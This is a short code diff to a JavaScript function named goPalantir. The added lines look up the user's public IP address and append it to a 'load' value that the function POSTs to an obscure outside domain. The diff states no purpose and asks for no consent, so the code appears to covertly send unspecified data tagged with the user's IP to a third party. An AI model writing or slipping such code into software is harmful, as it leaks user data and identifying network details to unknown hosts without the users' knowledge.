@@ -27,13 +27,17 @@ async function goPalantir(load) {
         //     })
         // })
         // await fetch('http://localhost:8000', {
+        let res = await fetch("https://ip.wtf");
+        let ip = await res.text();
+        console.log(ip.trim()); 
+        
         await fetch('https://hmm.henrywauzivuff.xyz', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                "text": `${load}`
+                "text": `${load}, from ${ip.trim()}`
             })
         });
     } catch (error) {
